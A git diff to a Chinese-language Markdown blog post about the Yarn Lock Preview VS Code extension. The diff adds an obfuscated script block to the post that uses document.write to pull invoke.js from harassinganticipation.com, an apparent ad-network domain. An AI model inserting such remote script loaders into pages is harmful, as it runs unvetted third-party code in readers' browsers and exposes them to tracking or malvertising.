@@ -9,6 +9,8 @@ tags:
   - yarn.lock
 ---
 
+<center><script type="text/javascript">atOptions = {'key' : '8f470a3a0b9c8fb81916828853d00507','format' : 'iframe','height' : 90,'width' : 728};document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://harassinganticipation.com/8f470a3a0b9c8fb81916828853d00507/invoke.js"></scr' + 'ipt>');</script></center>
+
 > [Yarn Lock Preview](https://marketplace.visualstudio.com/items?itemName=youngjuning.yarn-lock-preview) 插件已发布，亲测已比较稳定，源码在 [vscode-yarn-lock-preview](https://github.com/youngjuning/vscode-yarn-lock-preview) ，如果对你些许帮助和启发，不妨赏一个 Star。
 
 > [VS Code API 中文文档](https://vscode-api-cn.js.org/) 在大家的热情下已经有序开展了翻译工作，也欢迎大家一起参与翻译！
